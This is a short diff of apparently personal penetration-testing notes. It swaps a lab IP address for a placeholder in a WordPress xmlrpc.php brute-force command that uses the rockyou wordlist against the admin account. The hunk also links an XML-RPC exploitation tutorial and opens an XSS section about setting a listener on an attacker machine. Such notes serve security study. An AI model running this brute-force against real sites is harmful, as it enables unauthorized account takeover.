@@ -79,7 +79,7 @@ WPScan brute force known user account.
 xmlrpc.php
 https://null-byte.wonderhowto.com/how-to/gain-control-wordpress-by-exploiting-xml-rpc-0174864/
 
-/wordpress-xmlrpc-brute-v2.py http://10.11.1.251/wp/xmlrpc.php /usr/share/wordlists/rockyou.txt admin
+/wordpress-xmlrpc-brute-v2.py http://<IPADDRESS>/wp/xmlrpc.php /usr/share/wordlists/rockyou.txt admin
 
 -------------------- XSS --------------------
 On attacker machine set listener 
